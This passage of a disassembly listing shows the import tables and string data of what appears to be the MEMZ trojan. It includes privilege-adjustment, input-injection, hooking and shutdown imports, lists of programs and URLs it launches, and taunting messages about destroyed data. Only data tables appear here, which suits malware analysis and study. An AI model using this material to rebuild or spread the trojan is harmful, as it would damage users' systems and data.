.rdata:004035F4                 dd rva aWinmmDll        ; DLL Name
.rdata:004035F8                 dd rva PlaySoundA       ; Import Address Table
.rdata:004035FC __IMPORT_DESCRIPTOR_PSAPI dd rva off_4036AC ; Import Name Table
.rdata:00403600                 dd 0                    ; Time stamp
.rdata:00403604                 dd 0                    ; Forwarder Chain
.rdata:00403608                 dd rva aPsapiDll        ; DLL Name
.rdata:0040360C                 dd rva __imp_GetProcessImageFileNameA ; Import Address Table
.rdata:00403610                 db    0
.rdata:00403611                 db    0
.rdata:00403612                 db    0
.rdata:00403613                 db    0
.rdata:00403614                 db    0
.rdata:00403615                 db    0
.rdata:00403616                 db    0
.rdata:00403617                 db    0
.rdata:00403618                 db    0
.rdata:00403619                 db    0
.rdata:0040361A                 db    0
.rdata:0040361B                 db    0
.rdata:0040361C                 db    0
.rdata:0040361D                 db    0
.rdata:0040361E                 db    0
.rdata:0040361F                 db    0
.rdata:00403620                 db    0
.rdata:00403621                 db    0
.rdata:00403622                 db    0
.rdata:00403623                 db    0
.rdata:00403624 ;
.rdata:00403624 ; Import names for ADVAPI32.dll
.rdata:00403624 ;
.rdata:00403624 off_403624      dd rva word_403A82      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_ADVAPI32↑o
.rdata:00403628                 dd rva word_403A96
.rdata:0040362C                 dd rva word_403AAE
.rdata:00403630                 dd rva word_403AC6
.rdata:00403634                 dd rva word_403ADE
.rdata:00403638                 dd 0
.rdata:0040363C ;
.rdata:0040363C ; Import names for GDI32.dll
.rdata:0040363C ;
.rdata:0040363C off_40363C      dd rva word_403A60      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_GDI32↑o
.rdata:00403640                 dd rva word_403A6A
.rdata:00403644                 dd 0
.rdata:00403648 ;
.rdata:00403648 ; Import names for KERNEL32.dll
.rdata:00403648 ;
.rdata:00403648 off_403648      dd rva word_4037BE      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32↑o
.rdata:0040364C                 dd rva word_4037CA
.rdata:00403650                 dd rva word_4037D8
.rdata:00403654                 dd rva word_4037E4
.rdata:00403658                 dd rva word_4037F0
.rdata:0040365C                 dd rva word_403800
.rdata:00403660                 dd rva word_403816
.rdata:00403664                 dd rva word_4037B6
.rdata:00403668                 dd rva word_403836
.rdata:0040366C                 dd rva word_40384A
.rdata:00403670                 dd rva word_403866
.rdata:00403674                 dd rva word_403878
.rdata:00403678                 dd rva word_403888
.rdata:0040367C                 dd rva word_403896
.rdata:00403680                 dd rva word_4038A4
.rdata:00403684                 dd rva word_4037A0
.rdata:00403688                 dd rva word_403790
.rdata:0040368C                 dd rva word_403782
.rdata:00403690                 dd rva word_40376E
.rdata:00403694                 dd rva word_403760
.rdata:00403698                 dd rva word_403754
.rdata:0040369C                 dd rva word_403746
.rdata:004036A0                 dd rva word_403828
.rdata:004036A4                 dd rva word_403734
.rdata:004036A8                 dd 0
.rdata:004036AC ;
.rdata:004036AC ; Import names for PSAPI.DLL
.rdata:004036AC ;
.rdata:004036AC off_4036AC      dd rva word_403B5A      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_PSAPI↑o
.rdata:004036B0                 dd 0
.rdata:004036B4 ;
.rdata:004036B4 ; Import names for SHELL32.dll
.rdata:004036B4 ;
.rdata:004036B4 off_4036B4      dd rva word_403B0E      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_SHELL32↑o
.rdata:004036B8                 dd rva word_403AFE
.rdata:004036BC                 dd rva word_403B24
.rdata:004036C0                 dd 0
.rdata:004036C4 ;
.rdata:004036C4 ; Import names for USER32.dll
.rdata:004036C4 ;
.rdata:004036C4 off_4036C4      dd rva word_4039BE      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32↑o
.rdata:004036C8                 dd rva word_4039CA
.rdata:004036CC                 dd rva word_4039DA
.rdata:004036D0                 dd rva word_4039E8
.rdata:004036D4                 dd rva word_4039F8
.rdata:004036D8                 dd rva word_403A08
.rdata:004036DC                 dd rva word_403A1C
.rdata:004036E0                 dd rva word_403A2A
.rdata:004036E4                 dd rva word_403A36
.rdata:004036E8                 dd rva word_4039B0
.rdata:004036EC                 dd rva word_403972
.rdata:004036F0                 dd rva word_403950
.rdata:004036F4                 dd rva word_40393C
.rdata:004036F8                 dd rva word_40392A
.rdata:004036FC                 dd rva word_403916
.rdata:00403700                 dd rva word_403904
.rdata:00403704                 dd rva word_4038F4
.rdata:00403708                 dd rva word_4038E0
.rdata:0040370C                 dd rva word_4038CC
.rdata:00403710                 dd rva word_4039A4
.rdata:00403714                 dd rva word_403998
.rdata:00403718                 dd rva word_403A48
.rdata:0040371C                 dd rva word_403988
.rdata:00403720                 dd rva word_4038BE
.rdata:00403724                 dd rva word_40395E
.rdata:00403728                 dd 0
.rdata:0040372C ;
.rdata:0040372C ; Import names for WINMM.dll
.rdata:0040372C ;
.rdata:0040372C off_40372C      dd rva word_403B42      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_WINMM↑o
.rdata:00403730                 dd 0
.rdata:00403734 word_403734     dw 245h                 ; DATA XREF: .rdata:004036A4↑o
.rdata:00403736                 db 'GetProcAddress',0
.rdata:00403745                 align 2
.rdata:00403746 word_403746     dw 344h                 ; DATA XREF: .rdata:0040369C↑o
.rdata:00403748                 db 'LocalAlloc',0
.rdata:00403753                 align 4
.rdata:00403754 word_403754     dw 348h                 ; DATA XREF: .rdata:00403698↑o
.rdata:00403756                 db 'LocalFree',0
.rdata:00403760 word_403760     dw 380h                 ; DATA XREF: .rdata:00403694↑o
.rdata:00403762                 db 'OpenProcess',0
.rdata:0040376E word_40376E     dw 1C0h                 ; DATA XREF: .rdata:00403690↑o
.rdata:00403770                 db 'GetCurrentProcess',0
.rdata:00403782 word_403782     dw 119h                 ; DATA XREF: .rdata:0040368C↑o
.rdata:00403784                 db 'ExitProcess',0
.rdata:00403790 word_403790     dw 0B5h                 ; DATA XREF: .rdata:00403688↑o
.rdata:00403792                 db 'CreateThread',0
.rdata:0040379F                 align 10h
.rdata:004037A0 word_4037A0     dw 1C5h                 ; DATA XREF: .rdata:00403684↑o
.rdata:004037A2                 db 'GetCurrentThreadId',0
.rdata:004037B5                 align 2
.rdata:004037B6 word_4037B6     dw 4B2h                 ; DATA XREF: .rdata:00403664↑o
.rdata:004037B8                 db 'Sleep',0
.rdata:004037BE word_4037BE     dw 525h                 ; DATA XREF: .rdata:off_403648↑o
.rdata:004037C0                 db 'WriteFile',0
.rdata:004037CA word_4037CA     dw 52h                  ; DATA XREF: .rdata:0040364C↑o
.rdata:004037CC                 db 'CloseHandle',0
.rdata:004037D8 word_4037D8     dw 541h                 ; DATA XREF: .rdata:00403650↑o
.rdata:004037DA                 db 'lstrcmpA',0
.rdata:004037E3                 align 4
.rdata:004037E4 word_4037E4     dw 542h                 ; DATA XREF: .rdata:00403654↑o
.rdata:004037E6                 db 'lstrcmpW',0
.rdata:004037EF                 align 10h
.rdata:004037F0 word_4037F0     dw 33Ch                 ; DATA XREF: .rdata:00403658↑o
.rdata:004037F2                 db 'LoadLibraryA',0
.rdata:004037FF                 align 10h
.rdata:00403800 word_403800     dw 213h                 ; DATA XREF: .rdata:0040365C↑o
.rdata:00403802                 db 'GetModuleFileNameA',0
.rdata:00403815                 align 2
.rdata:00403816 word_403816     dw 187h                 ; DATA XREF: .rdata:00403660↑o
.rdata:00403818                 db 'GetCommandLineW',0
.rdata:00403828 word_403828     dw 88h                  ; DATA XREF: .rdata:004036A0↑o
.rdata:0040382A                 db 'CreateFileA',0
.rdata:00403836 word_403836     dw 47Dh                 ; DATA XREF: .rdata:00403668↑o
.rdata:00403838                 db 'SetPriorityClass',0
.rdata:00403849                 align 2
.rdata:0040384A word_40384A     dw 0BEh                 ; DATA XREF: .rdata:0040366C↑o
.rdata:0040384C                 db 'CreateToolhelp32Snapshot',0
.rdata:00403865                 align 2
.rdata:00403866 word_403866     dw 395h                 ; DATA XREF: .rdata:00403670↑o
.rdata:00403868                 db 'Process32First',0
.rdata:00403877                 align 4
.rdata:00403878 word_403878     dw 397h                 ; DATA XREF: .rdata:00403674↑o
.rdata:0040387A                 db 'Process32Next',0
.rdata:00403888 word_403888     dw 2B3h                 ; DATA XREF: .rdata:00403678↑o
.rdata:0040388A                 db 'GlobalAlloc',0
.rdata:00403896 word_403896     dw 2BAh                 ; DATA XREF: .rdata:0040367C↑o
.rdata:00403898                 db 'GlobalFree',0
.rdata:004038A3                 align 4
.rdata:004038A4 word_4038A4     dw 54Eh                 ; DATA XREF: .rdata:00403680↑o
.rdata:004038A6                 db 'lstrlenW',0
.rdata:004038AF                 align 10h
.rdata:004038B0 aKernel32Dll    db 'KERNEL32.dll',0     ; DATA XREF: .rdata:00403590↑o
.rdata:004038BD                 align 2
.rdata:004038BE word_4038BE     dw 159h                 ; DATA XREF: .rdata:00403720↑o
.rdata:004038C0                 db 'GetMessageA',0
.rdata:004038CC word_4038CC     dw 2FCh                 ; DATA XREF: .rdata:0040370C↑o
.rdata:004038CE                 db 'TranslateMessage',0
.rdata:004038DF                 align 10h
.rdata:004038E0 word_4038E0     dw 0AEh                 ; DATA XREF: .rdata:00403708↑o
.rdata:004038E2                 db 'DispatchMessageA',0
.rdata:004038F3                 align 4
.rdata:004038F4 word_4038F4     dw 0F5h                 ; DATA XREF: .rdata:00403704↑o
.rdata:004038F6                 db 'ExitWindowsEx',0
.rdata:00403904 word_403904     dw 9Bh                  ; DATA XREF: .rdata:00403700↑o
.rdata:00403906                 db 'DefWindowProcA',0
.rdata:00403915                 align 2
.rdata:00403916 word_403916     dw 24Ch                 ; DATA XREF: .rdata:004036FC↑o
.rdata:00403918                 db 'RegisterClassExA',0
.rdata:00403929                 align 2
.rdata:0040392A word_40392A     dw 6Dh                  ; DATA XREF: .rdata:004036F8↑o
.rdata:0040392C                 db 'CreateWindowExA',0
.rdata:0040393C word_40393C     dw 17Eh                 ; DATA XREF: .rdata:004036F4↑o
.rdata:0040393E                 db 'GetSystemMetrics',0
.rdata:0040394F                 align 10h
.rdata:00403950 word_403950     dw 20Eh                 ; DATA XREF: .rdata:004036F0↑o
.rdata:00403952                 db 'MessageBoxA',0
.rdata:0040395E word_40395E     dw 2CEh                 ; DATA XREF: .rdata:00403724↑o
.rdata:00403960                 db 'SetWindowsHookExA',0
.rdata:00403972 word_403972     dw 300h                 ; DATA XREF: .rdata:004036EC↑o
.rdata:00403974                 db 'UnhookWindowsHookEx',0
.rdata:00403988 word_403988     dw 27Ch                 ; DATA XREF: .rdata:0040371C↑o
.rdata:0040398A                 db 'SendMessageW',0
.rdata:00403997                 align 4
.rdata:00403998 word_403998     dw 276h                 ; DATA XREF: .rdata:00403714↑o
.rdata:0040399A                 db 'SendInput',0
.rdata:004039A4 word_4039A4     dw 0C7h                 ; DATA XREF: .rdata:00403710↑o
.rdata:004039A6                 db 'DrawIcon',0
.rdata:004039AF                 align 10h
.rdata:004039B0 word_4039B0     dw 192h                 ; DATA XREF: .rdata:004036E8↑o
.rdata:004039B2                 db 'GetWindowDC',0
.rdata:004039BE word_4039BE     dw 265h                 ; DATA XREF: .rdata:off_4036C4↑o
.rdata:004039C0                 db 'ReleaseDC',0
.rdata:004039CA word_4039CA     dw 19Ch                 ; DATA XREF: .rdata:004036C8↑o
.rdata:004039CC                 db 'GetWindowRect',0
.rdata:004039DA word_4039DA     dw 215h                 ; DATA XREF: .rdata:004036CC↑o
.rdata:004039DC                 db 'MessageBoxW',0
.rdata:004039E8 word_4039E8     dw 28Ah                 ; DATA XREF: .rdata:004036D0↑o
.rdata:004039EA                 db 'SetCursorPos',0
.rdata:004039F7                 align 4
.rdata:004039F8 word_4039F8     dw 120h                 ; DATA XREF: .rdata:004036D4↑o
.rdata:004039FA                 db 'GetCursorPos',0
.rdata:00403A07                 align 4
.rdata:00403A08 word_403A08     dw 123h                 ; DATA XREF: .rdata:004036D8↑o
.rdata:00403A0A                 db 'GetDesktopWindow',0
.rdata:00403A1B                 align 4
.rdata:00403A1C word_403A1C     dw 0F2h                 ; DATA XREF: .rdata:004036DC↑o
.rdata:00403A1E                 db 'EnumWindows',0
.rdata:00403A2A word_403A2A     dw 18Eh                 ; DATA XREF: .rdata:004036E0↑o
.rdata:00403A2C                 db 'GetWindow',0
.rdata:00403A36 word_403A36     dw 1Ch                  ; DATA XREF: .rdata:004036E4↑o
.rdata:00403A38                 db 'CallNextHookEx',0
.rdata:00403A47                 align 4
.rdata:00403A48 word_403A48     dw 1ECh                 ; DATA XREF: .rdata:00403718↑o
.rdata:00403A4A                 db 'LoadIconA',0
.rdata:00403A54 aUser32Dll      db 'USER32.dll',0       ; DATA XREF: .rdata:004035A4↑o
.rdata:00403A5F                 align 10h
.rdata:00403A60 word_403A60     dw 13h                  ; DATA XREF: .rdata:off_40363C↑o
.rdata:00403A62                 db 'BitBlt',0
.rdata:00403A69                 align 2
.rdata:00403A6A word_403A6A     dw 2B3h                 ; DATA XREF: .rdata:00403640↑o
.rdata:00403A6C                 db 'StretchBlt',0
.rdata:00403A77                 align 4
.rdata:00403A78 aGdi32Dll       db 'GDI32.dll',0        ; DATA XREF: .rdata:004035B8↑o
.rdata:00403A82 word_403A82     dw 1F7h                 ; DATA XREF: .rdata:off_403624↑o
.rdata:00403A84                 db 'OpenProcessToken',0
.rdata:00403A95                 align 2
.rdata:00403A96 word_403A96     dw 1Fh                  ; DATA XREF: .rdata:00403628↑o
.rdata:00403A98                 db 'AdjustTokenPrivileges',0
.rdata:00403AAE word_403AAE     dw 196h                 ; DATA XREF: .rdata:0040362C↑o
.rdata:00403AB0                 db 'LookupPrivilegeValueA',0
.rdata:00403AC6 word_403AC6     dw 0B0h                 ; DATA XREF: .rdata:00403630↑o
.rdata:00403AC8                 db 'CryptAcquireContextA',0
.rdata:00403ADD                 align 2
.rdata:00403ADE word_403ADE     dw 0C1h                 ; DATA XREF: .rdata:00403634↑o
.rdata:00403AE0                 db 'CryptGenRandom',0
.rdata:00403AEF                 align 10h
.rdata:00403AF0 aAdvapi32Dll    db 'ADVAPI32.dll',0     ; DATA XREF: .rdata:004035CC↑o
.rdata:00403AFD                 align 2
.rdata:00403AFE word_403AFE     dw 11Eh                 ; DATA XREF: .rdata:004036B8↑o
.rdata:00403B00                 db 'ShellExecuteA',0
.rdata:00403B0E word_403B0E     dw 6                    ; DATA XREF: .rdata:off_4036B4↑o
.rdata:00403B10                 db 'CommandLineToArgvW',0
.rdata:00403B23                 align 4
.rdata:00403B24 word_403B24     dw 120h                 ; DATA XREF: .rdata:004036BC↑o
.rdata:00403B26                 db 'ShellExecuteExA',0
.rdata:00403B36 aShell32Dll     db 'SHELL32.dll',0      ; DATA XREF: .rdata:004035E0↑o
.rdata:00403B42 word_403B42     dw 8                    ; DATA XREF: .rdata:off_40372C↑o
.rdata:00403B44                 db 'PlaySoundA',0
.rdata:00403B4F                 align 10h
.rdata:00403B50 aWinmmDll       db 'WINMM.dll',0        ; DATA XREF: .rdata:004035F4↑o
.rdata:00403B5A word_403B5A     dw 13h                  ; DATA XREF: .rdata:off_4036AC↑o
.rdata:00403B5C                 db 'GetProcessImageFileNameA',0
.rdata:00403B75                 align 2
.rdata:00403B76 aPsapiDll       db 'PSAPI.DLL',0        ; DATA XREF: .rdata:00403608↑o
.rdata:00403B80                 align 800h
.rdata:00403B80 _rdata          ends
.rdata:00403B80
.data:00404000 ; Section 3. (virtual address 00004000)
.data:00404000 ; Virtual size                  : 000000F4 (    244.)
.data:00404000 ; Section size in file          : 00000200 (    512.)
.data:00404000 ; Offset to raw data for section: 00002C00
.data:00404000 ; Flags C0000040: Data Readable Writable
.data:00404000 ; Alignment     : default
.data:00404000 ; ===========================================================================
.data:00404000
.data:00404000 ; Segment type: Pure data
.data:00404000 ; Segment permissions: Read/Write
.data:00404000 _data           segment para public 'DATA' use32
.data:00404000                 assume cs:_data
.data:00404000                 ;org 404000h
.data:00404000 ; LPCSTR lpFile
.data:00404000 lpFile          dd offset aHttpsGoogleCoC
.data:00404000                                         ; DATA XREF: sub_4014CA+18↑r
.data:00404000                                         ; "https://google.co.ck/search?q=best+way+"...
.data:00404004                 dd offset aHttpsGoogleCoC_0 ; "https://google.co.ck/search?q=how+2+rem"...
.data:00404008                 dd offset aHttpsGoogleCoC_1 ; "https://google.co.ck/search?q=mcafee+vs"...
.data:0040400C                 dd offset aHttpsGoogleCoC_2 ; "https://google.co.ck/search?q=how+to+se"...
.data:00404010                 dd offset aHttpsGoogleCoC_3 ; "https://google.co.ck/search?q=minecraft"...
.data:00404014                 dd offset aHttpsGoogleCoC_4 ; "https://google.co.ck/search?q=how+to+ge"...
.data:00404018                 dd offset aHttpsGoogleCoC_5 ; "https://google.co.ck/search?q=bonzi+bud"...
.data:0040401C                 dd offset aHttpsGoogleCoC_6 ; "https://google.co.ck/search?q=how+2+buy"...
.data:00404020                 dd offset aHttpsGoogleCoC_7 ; "https://google.co.ck/search?q=how+to+co"...
.data:00404024                 dd offset aHttpsGoogleCoC_8 ; "https://google.co.ck/search?q=what+happ"...
.data:00404028                 dd offset aHttpsGoogleCoC_9 ; "https://google.co.ck/search?q=g3t+r3kt"
.data:0040402C                 dd offset aHttpsGoogleCoC_10 ; "https://google.co.ck/search?q=batch+vir"...
.data:00404030                 dd offset aHttpsGoogleCoC_11 ; "https://google.co.ck/search?q=virus.exe"
.data:00404034                 dd offset aHttpsGoogleCoC_12 ; "https://google.co.ck/search?q=internet+"...
.data:00404038                 dd offset aHttpsGoogleCoC_13 ; "https://google.co.ck/search?q=facebook+"...
.data:0040403C                 dd offset aHttpsGoogleCoC_14 ; "https://google.co.ck/search?q=virus+bui"...
.data:00404040                 dd offset aHttpsGoogleCoC_15 ; "https://google.co.ck/search?q=how+to+cr"...
.data:00404044                 dd offset aHttpsGoogleCoC_16 ; "https://google.co.ck/search?q=how+to+re"...
.data:00404048                 dd offset aHttpsGoogleCoC_17 ; "https://google.co.ck/search?q=my+comput"...
.data:0040404C                 dd offset aHttpPlayClubpe ; "http://play.clubpenguin.com"
.data:00404050                 dd offset aHttpPcoptimize ; "http://pcoptimizerpro.com"
.data:00404054                 dd offset aHttpSoftonicCo ; "http://softonic.com"
.data:00404058                 dd offset aCalc         ; "calc"
.data:0040405C                 dd offset File          ; "notepad"
.data:00404060                 dd offset aCmd          ; "cmd"
.data:00404064                 dd offset aWrite        ; "write"
.data:00404068                 dd offset aRegedit      ; "regedit"
.data:0040406C                 dd offset aExplorer     ; "explorer"
.data:00404070                 dd offset aTaskmgr      ; "taskmgr"
.data:00404074                 dd offset aMsconfig     ; "msconfig"
.data:00404078                 dd offset aMspaint      ; "mspaint"
.data:0040407C                 dd offset aDevmgmtMsc   ; "devmgmt.msc"
.data:00404080                 dd offset aControl      ; "control"
.data:00404084                 dd offset aMmc          ; "mmc"
.data:00404088 ; LPCSTR lpText
.data:00404088 lpText          dd offset aYouKilledMyTro
.data:00404088                                         ; DATA XREF: sub_401021+10D↑r
.data:00404088                                         ; "YOU KILLED MY TROJAN!\r\nNow you are go"...
.data:0040408C                 dd offset aRestInPissFore ; "REST IN PISS, FOREVER MISS."
.data:00404090                 dd offset aIWarnedYou   ; "I WARNED YOU..."
.data:00404094                 dd offset aHahaN00bL2pG3t ; "HAHA N00B L2P G3T R3KT"
.data:00404098                 dd offset aYouFailedAtYou ; "You failed at your 1337 h4x0r skillz."
.data:0040409C                 dd offset aYouTriedSoHard ; "YOU TRIED SO HARD AND GOT SO FAR, BUT I"...
.data:004040A0                 dd offset aHackerEnjoyBan ; "HACKER!\r\nENJOY BAN!"
.data:004040A4                 dd offset aGetBetterHaxNe ; "GET BETTER HAX NEXT TIME xD"
.data:004040A8                 dd offset aHaveFunTryingT ; "HAVE FUN TRYING TO RESTORE YOUR DATA :D"
.data:004040AC                 dd offset a32           ; "|\\/|3|\\/|2"
.data:004040B0                 dd offset aBsodIncoming ; "BSOD INCOMING"
.data:004040B4                 dd offset aVirusPrankGone ; "VIRUS PRANK (GONE WRONG)"
.data:004040B8                 dd offset aEnjoyTheNyanCa ; "ENJOY THE NYAN CAT"
.data:004040BC                 dd offset aGetMlgAntiviru ; "GET MLG ANTIVIRUS NEXT TIME"
.data:004040C0                 dd offset aYouAreAnIdiotH ; "You are an idiot!\r\nHA HA HA HA HA HA "...
.data:004040C4                 dd offset aMakemalwaregre ; "#MakeMalwareGreatAgain"
.data:004040C8                 dd offset aSomebodyOnceTo ; "SOMEBODY ONCE TOLD ME THE MEMZ ARE GONN"...
.data:004040CC                 dd offset aWhyDidYouEvenT ; "Why did you even tried to kill MEMZ?\r"...
.data:004040D0                 dd offset aSecurebootSuck ; "SecureBoot sucks."
.data:004040D4                 dd offset aGr8M8IR888   ; "gr8 m8 i r8 8/8"
.data:004040D8 ; LPCSTR pszSound
.data:004040D8 pszSound        dd offset aSystemhand   ; DATA XREF: sub_401667+11↑r
.data:004040D8                                         ; "SystemHand"
.data:004040DC                 dd offset aSystemquestion ; "SystemQuestion"
.data:004040E0                 dd offset aSystemexclamat ; "SystemExclamation"
.data:004040E4 dword_4040E4    dd 0                    ; DATA XREF: start+16↑w
.data:004040E4                                         ; sub_40182D+B8↑r ...
.data:004040E8 dword_4040E8    dd 0                    ; DATA XREF: start+1D↑w
.data:004040E8                                         ; sub_40182D+AB↑r ...
.data:004040EC ; HCRYPTPROV hProv
.data:004040EC hProv           dd 0                    ; DATA XREF: sub_401A37+4↑r
.data:004040EC                                         ; sub_401A37+16↑o ...
.data:004040F0                 align 1000h
.data:004040F0 _data           ends
.data:004040F0
.data:004040F0
.data:004040F0                 end start
